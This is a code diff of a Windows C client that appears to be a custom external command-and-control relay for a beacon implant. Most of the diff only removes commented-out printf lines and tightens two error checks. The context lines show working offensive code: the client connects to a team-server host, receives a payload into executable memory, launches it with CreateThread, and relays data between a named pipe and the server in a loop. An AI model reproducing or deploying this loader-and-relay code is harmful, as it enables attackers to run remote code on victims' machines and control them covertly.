@@ -49,7 +49,6 @@ SOCKET create_socket(char* ip, char* port, int timeout_sec)
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0) {
-		//printf("WSAStartup failed with error: %d\n", iResult);
 		debug_print("WSAStartup failed with error: %d\n", iResult);
 		return INVALID_SOCKET;
 	}
@@ -62,7 +61,6 @@ SOCKET create_socket(char* ip, char* port, int timeout_sec)
 	// Resolve the server address and port
 	iResult = getaddrinfo(ip, port, &hints, &result);
 	if (iResult != 0) {
-		//printf("getaddrinfo failed: %d\n", iResult);
 		debug_print("getaddrinfo failed: %d\n", iResult);
 		WSACleanup();
 		return INVALID_SOCKET;
@@ -74,7 +72,6 @@ SOCKET create_socket(char* ip, char* port, int timeout_sec)
 	// Create a SOCKET for connecting to server
 	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
 	if (ConnectSocket == INVALID_SOCKET) {
-		//printf("Error at socket(): %ld\n", WSAGetLastError());
 		debug_print("Error at socket(): %ld\n", WSAGetLastError());
 		freeaddrinfo(result);
 		WSACleanup();
@@ -104,7 +101,6 @@ SOCKET create_socket(char* ip, char* port, int timeout_sec)
 	freeaddrinfo(result);
 
 	if (ConnectSocket == INVALID_SOCKET) {
-		//printf("Unable to connect to server!\n");
 		debug_print("%s", "Unable to connect to server!\n");
 		WSACleanup();
 		return INVALID_SOCKET;
@@ -226,8 +222,6 @@ void main(int argc, char* argv[])
 	// Set connection info
 	if (argc != 6)
 	{
-		//printf("Incorrect number of args: %d\n", argc);
-		//printf("Incorrect number of args: client.exe [IP] [PORT] [PIPE_STR] [SLEEP]");
 		debug_print("Incorrect number of args: %d\n", argc);
 		debug_print("Incorrect number of args: %s [IP] [PORT] [PIPE_STR] [SLEEP] [TIMEOUT]\n", argv[0]);
 		exit(1);
@@ -259,7 +253,6 @@ void main(int argc, char* argv[])
 	sockfd = create_socket(IP, PORT, TIMEOUT_SEC);
 	if (sockfd == INVALID_SOCKET)
 	{
-		//printf("Socket creation error!\n");
 		debug_print("%s", "Socket creation error!\n");
 		exit(1);
 	}
@@ -268,19 +261,16 @@ void main(int argc, char* argv[])
 	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (payload == NULL)
 	{
-		//printf("payload buffer malloc failed!\n");
 		debug_print("%s", "payload buffer malloc failed!\n");
 		exit(1);
 	}
 	DWORD payload_size = recvData(sockfd, payload, BUFFER_MAX_SIZE);
 	if (payload_size < 0)
 	{
-		//printf("recvData error, exiting\n");
 		debug_print("%s", "recvData error, exiting\n");
 		free(payload);
 		exit(1);
 	}
-	//printf("Recv %d byte payload from TS\n", payload_size);
 	debug_print("Recv %d byte payload from TS\n", payload_size);
 	/* inject the payload stage into the current process */
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
@@ -295,14 +285,12 @@ void main(int argc, char* argv[])
 		// Full string (i.e. "\\\\.\\pipe\\mIRC")
 		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);
 	}
-	//printf("Connected to pipe!!\n");
 	debug_print("%s", "Connected to pipe!!\n");
 
 	// Mudge used 1MB max in his example, this may be because SMB beacons are only able to send 1MB of data within each response.
 	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
 	if (buffer == NULL)
 	{
-		//printf("buffer malloc failed!\n");
 		debug_print("%s", "buffer malloc failed!\n");
 		free(payload);
 		exit(1);
@@ -311,18 +299,15 @@ void main(int argc, char* argv[])
 	while (1) {
 		// Start the pipe dance
 		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
-		if (read_size < 0)
+		if (read_size <= 0)
 		{
-			//printf("read_frame error, exiting\n");
 			debug_print("%s", "read_frame error, exiting\n");
 			break;
 		}
-		//printf("Recv %d bytes from beacon\n", read_size);
 		debug_print("Recv %d bytes from beacon\n", read_size);
 		
 		if (read_size == 1)
 		{
-			//printf("Finished sending, sleeping %d seconds..\n", sleep);
 			debug_print("Finished sending, sleeping %d seconds..\n", sleep);
 			Sleep(sleep*1000);
 		}
@@ -335,21 +320,17 @@ void main(int argc, char* argv[])
 		}
 		*/
 		sendData(sockfd, buffer, read_size);
-		//printf("Sent to TS\n");
 		debug_print("%s", "Sent to TS\n");
 		
 		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE);
-		if (read_size < 0)
+		if (read_size <= 0)
 		{
-			//printf("recvData error, exiting\n");
 			debug_print("%s", "recvData error, exiting\n");
 			break;
 		}
-		//printf("Recv %d bytes from TS\n", read_size);
 		debug_print("Recv %d bytes from TS\n", read_size);
 
 		write_frame(beaconPipe, buffer, read_size);
-		//printf("Sent to beacon\n");
 		debug_print("%s", "Sent to beacon\n");
 	}
 	free(payload);
